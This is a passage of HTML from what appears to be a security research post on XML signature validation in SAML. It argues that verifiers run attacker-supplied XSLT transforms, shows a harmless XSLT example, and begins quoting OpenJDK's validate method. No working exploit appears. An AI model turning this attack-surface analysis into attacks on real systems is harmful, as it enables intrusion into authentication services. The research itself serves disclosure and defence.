on.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Correctly validating XML signatures and making sure the data we care about is protected, is very difficult in the context of SAML. This will be a topic for later blog posts, but at this point we want to focus on the reference validation step:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As part of this step, the application verifying a signature has to run attacker controlled transforms on attacker controlled input. Looking at the list of transformations supported by XMLDsig, one seems particularly interesting: XSLT.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XSLT, which stands for Extensible Stylesheet Language Transformations, is a feature-rich XML based programming language designed for transforming XML documents. Embedding a XSLT transform in a XML signature means that the verifier has to run the XSLT program on the referenced XML data.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The code snippet below gives you an example of a simple XSLT transformation. When executed it fetches each </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;data&gt;</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element stored inside </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;input&gt;</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, grabs the first character of its content and returns it as part of its </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;output&gt;</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. So </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;input&gt;&lt;data&gt;abc&lt;/data&gt;&lt;data&gt;def&lt;/data&gt;&lt;/input&gt;</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> would be transformed into </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;output&gt;&lt;data&gt;a&lt;/data&gt;&lt;data&gt;d&lt;/data&gt;&lt;/output&gt;</span></p><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;Transform</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> Algorithm</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"http://www.w3.org/TR/1999/REC-xslt-19991116"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;xsl:stylesheet</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> xmlns:xsl</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"</span><a href="http://www.w3.org/1999/XSL/Transform" style="text-decoration-line: none;"><span style="background-color: transparent; color: black; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">http://www.w3.org/1999/XSL/Transform</span></a><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;xmlns</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"http://www.w3.org/TR/xhtml1/strict" exclude-result-prefixes</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"foo"&nbsp;&nbsp;&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;version</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"1.0"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;xsl:output</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> encoding</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"UTF-8" indent</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"no" method</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"xml" </span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;xsl:template</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> match</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"/input"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;output&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;xsl:for-each</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> select</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"data"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;data&gt;&lt;xsl:value-of</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> select</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"substring(.,1,1)" </span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;&lt;/data&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/xsl:for-each&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/output&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/xsl:template&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/xsl:stylesheet&gt;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;/Transform&gt;</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Exposing a fully-featured language runtime to an external attacker seems like a bad idea, so let's take a look at how this feature is implemented in Javas OpenJDK.</span></p><br /><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">XSLT in Java</span></h2><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Javas main interface for working with XML signatures is the </span><a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.xml.crypto/javax/xml/crypto/dsig/XMLSignature.html" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">java.xml.crypto.XMLSignature </span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">class and its sign and validate methods. We are mostly interested in the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validate</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> method which is shown below:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">// https://github.com/openjdk/jdk/blob/master/src/java.xml.crypto/share/classes/org/jcp/xml/dsig/internal/dom/DOMXMLSignature.java</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #c53929; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">@Override</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">public</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">boolean</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> validate</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XMLValidateContext</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> vc</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">throws</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XMLSignatureException</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[..]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #455a64; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">// validate the signature</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">boolean</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> sigValidity </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> sv</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">validate</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">vc</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">);</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">(</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">A</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">)</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">if</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">(!</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">sigValidity</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; 